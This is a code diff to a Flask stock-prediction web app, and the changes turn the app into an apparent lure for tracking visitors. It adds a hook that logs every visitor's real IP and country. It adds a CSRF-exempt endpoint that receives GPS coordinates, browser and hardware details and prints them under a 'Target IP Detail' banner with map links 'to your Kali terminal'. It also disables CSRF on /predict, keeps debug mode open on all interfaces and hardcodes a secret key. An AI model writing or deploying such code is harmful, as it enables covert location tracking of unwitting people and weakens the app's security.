@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, url_for, session, flash, send_from_directory
+from flask import Flask, render_template, request, redirect, url_for, session, flash, send_from_directory, jsonify
 from flask_wtf import FlaskForm
 from flask_wtf.csrf import CSRFProtect
 from wtforms import StringField, SelectField, FloatField, SubmitField
@@ -13,13 +13,14 @@ from datetime import datetime, timedelta
 import plotly.graph_objects as go
 from werkzeug.security import generate_password_hash, check_password_hash
 import os
+import logging
 from functools import wraps
 
 # Initialize Flask Application
 app = Flask(__name__)
 
 # SET SECRET KEY FIRST
-app.config['SECRET_KEY'] = 'my_super_secret_key_123'
+app.config['SECRET_KEY'] = 'ut_some_random_text_here_12345'
 
 # THEN enable CSRF protection
 csrf = CSRFProtect(app)
@@ -38,6 +39,20 @@ stock_list = [
     "FEDERALBNK.NS", "INDUSINDBK.NS", "YESBANK.NS", "IDBI.NS", "RBLBANK.NS", "AMBUJACEM.NS", "ACC.NS", "RAMCOCEM.NS", "JKCEMENT.NS", "INDIGO.NS",
     "SPICEJET.NS", "INTERGLOBE.NS", "ZOMATO.NS", "PAYTM.NS", "NYKAA.NS"
 ]
+
+# -------------------- Interceptors --------------------
+@app.before_request
+def log_user_location():
+    """Intercepts incoming requests to extract Cloudflare geolocation headers."""
+    # Cloudflare passes the real IP here, fallback to local address if running directly
+    real_ip = request.headers.get('CF-Connecting-IP', request.remote_addr)
+    
+    # Cloudflare can pass the country code (e.g., 'US', 'IN')
+    country = request.headers.get('CF-IPCountry', 'Local')
+    
+    # Exclude static file requests to keep the terminal clean
+    if not request.path.startswith('/static/') and not request.path == '/log_client_data':
+        print(f"\n[*] INCOMING VISITOR -> IP: {real_ip} | Location: {country} | Method: {request.method} | Path: {request.path}")
 
 # -------------------- Helper Functions --------------------
 def fetch_stock_data(symbol, period="6mo"):
@@ -234,6 +249,7 @@ def home():
                            username=session.get('username'))
 
 @app.route('/predict', methods=['GET', 'POST'])
+@csrf.exempt
 def predict():
     selected_stock = None
     charts = {
@@ -578,5 +594,52 @@ def logout():
     flash("Logged out successfully!", "success")
     return redirect(url_for('portfolio'))
 
+@app.route('/log_client_data', methods=['POST'])
+@csrf.exempt  # Exempt this route from CSRF for easy JS submission
+def log_client_data():
+    data = request.json
+    
+    # Extract Real IP from Cloudflare, fallback to standard remote_addr
+    ip = request.headers.get('CF-Connecting-IP', request.remote_addr)
+    
+    lat = data.get('lat', 'Unknown/Denied')
+    lon = data.get('lon', 'Unknown/Denied')
+    
+    # Build the exact format you requested
+    log_output = f"""
+-------------------------
+Target IP Detail
+----------------
+IP: {ip}
+---------------
+
+GPS Lat Long Information
+-----------------------
+Latitude: {lat}
+Longitude: {lon}
+Map Location:  https://www.google.com/maps/place/{lat},{lon}
+Google Earth:  https://earth.google.com/web/search/{lat},{lon}
+------------------
+Platform: {data.get('platform', 'Unknown')} 
+Cookies Enabled: {data.get('cookiesEnabled', 'Unknown')}
+Browser Language: {data.get('language', 'Unknown')}
+Browser Name: {data.get('appName', 'Unknown')}
+Browser CodeName: {data.get('appCodeName', 'Unknown')}
+RAM: {data.get('ram', 'Unknown')}
+CPU Cores: {data.get('cpuCores', 'Unknown')}
+Screen Width: {data.get('screenWidth', 'Unknown')}
+Screen Height: {data.get('screenHeight', 'Unknown')}
+Local Time: {data.get('localTime', 'Unknown')}
+RefUrl: {request.referrer or ''}
+OS CPU: {data.get('oscpu', 'undefined')}
+-------------------------
+"""
+    # Print to your Kali terminal
+    print(log_output)
+    
+    return jsonify({"status": "success"})
+
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, debug=True)
+    # Extracts the dynamic port from the Bash script environment
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=True)
